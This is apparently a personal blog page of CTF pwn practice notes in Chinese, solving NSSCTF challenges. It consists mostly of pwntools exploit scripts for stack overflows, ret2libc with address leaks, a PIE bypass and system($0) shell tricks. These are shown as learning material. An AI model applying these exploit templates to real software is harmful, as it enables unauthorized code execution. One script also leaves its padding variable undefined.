---
title: 'NSSCTF_pwn_刷题笔记page'
date: 2024-11-11 13:00:00 +0800
categories: [合集]
tags: [ctf,pwn]
---
# NSSCTF_pwn_刷题笔记page(1)

### [SWPUCTF 2021 新生赛]gift_pwn

```python
from pwn import *
io = remote('node4.anna.nssctf.cn',28991)
padding = 16+8
shell = 0x4005B6

payload = b'A'*padding+p64(shell)
io.sendline(payload)

io.interactive()
```

### [SWPUCTF 2021 新生赛]whitegive_pwn

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = 'debug'
io = remote('node4.anna.nssctf.cn',28982)
#io = gdb.debug('./附件')
elf = ELF('./附件')
padding = 16+8
pop_rdi = 0x0000000000400763

payload = b'A'*padding + p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(elf.sym['main'])

io.sendline(payload)

puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

print(hex(puts_addr))

base_offset = puts_addr - 0x06f6a0
sys = 0x0453a0+base_offset
bin_sh = 0x18ce57+base_offset


payload1 = b'A'*padding+p64(pop_rdi)+p64(bin_sh)+p64(sys)
io.sendline(payload1)

io.interactive()
```

libc版本要另外搜索

###[CISCN 2019华北]PWN1

```python
from pwn import *
context.log_level = 'debug'
io = remote('node4.anna.nssctf.cn',28020)
padding = 44
payload =b'A'*padding+p64(0x41348000)
io.sendlineafter(b'number.',payload)
io.interactive()
```

```python
from pwn import *
context.log_level = 'debug'
io = remote('node4.anna.nssctf.cn',28020)
padding = 56
payload =b'A'*padding+p64(0x4006be)
io.sendlineafter(b'number.',payload)
io.interactive()
```

### [NISACTF 2022]ReorPwn?

```shell
hs/nib/
```

### [BJDCTF 2020]babystack2.0

```python
from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
#io = gdb.debug('./pwn')
io = remote('node4.anna.nssctf.cn',28485)
padding = 12+8+4
payload = b'A'*padding+p64(0x400726)

io.sendlineafter('name:\n',b'-1')

io.sendlineafter('name?\n',payload)
io.interactive()
#本地要栈对齐
```

ida判断的栈空间不正确,手动调试一下

### [HNCTF 2022 Week1]easync

`nc`进去找,格式为nssctf{}

### [BJDCTF 2020]babystack

```python
from pwn import *
context.log_level = 'debug'
#io = process('./ret2text')
#io = gdb.debug('./ret2text')
io = remote('node4.anna.nssctf.cn',28587)
padding = 12+8+4
payload = b'A'*padding+p64(0x4006e6)

io.sendlineafter('name:\n',b'100')

io.sendlineafter('?\n',payload)
io.interactive()
#本地要栈对齐
```

ida判断的栈空间不正确,手动调试一下

### [SWPUCTF 2022 新生赛]Does your nc work？

`nc`进去找

### [NISACTF 2022]ezstack

```python
from pwn import *
#io = process('./pwn')
io = remote('node5.anna.nssctf.cn',28318)
elf = ELF('./pwn')
padding = 72+4

payload = b'A'*padding + p32(0x8048512)+p32(0x804A024)

io.sendline(payload)
io.interactive()
```

`32`位程序调用函数方法与`64`位不同

### [watevrCTF 2019]Voting Machine 1

```python
from pwn import *
#io = process('./pwn')
io = remote('node5.anna.nssctf.cn',28007)
payload = b'A'*padding + p64(0x400807)

io.sendline(payload)
io.recvall()
io.interactive()
```

有后门函数...

### [NISACTF 2022]ezpie

```python
from pwn import *

#io = process('./pwn')
io = remote('node5.anna.nssctf.cn',28323)
padding = 44

io.recvuntil(b'gift!\n')
main_addr = eval(io.recvline().decode())
base_offset = main_addr - 0x770
shell_addr = base_offset+0x80F

payload = b'A'*padding +p32(shell_addr)

io.sendline(payload)
io.interactive()
```

主要是`pie`机制,和泄露`lib`差不多的思路

### [HGAME 2023 week1]test_nc

```shell
cat flag
```

### [GFCTF 2021]where_is_shell

```python
from pwn import *
#io = process('./shell')
io = remote('node4.anna.nssctf.cn',28065)
elf = ELF('./shell')
pop_rdi = 0x00000000004005e3 #: pop rdi ; ret
sys_addr = 0x400557
ret_addr = 0x0000000000400416 #: ret
padding = 0x10+8

payload = b'A'*padding+p64(ret_addr)+p64(pop_rdi)+p64(0x400541)+p64(elf.plt['system'])+p64(ret_addr)
io.sendline(payload)

io.interactive()
```

可以利用`system($0)`获得shell权限，`$0`在机器码中为 `\x24\x30`,`tips`函数中提供了相应的机器码,又一个小知识点

### [HNCTF 2022 Week1]easyoverflow

```shell
1111111111111111111111111111111111111111111111111111
```

参数覆盖,溢出`v4`覆盖`v5`
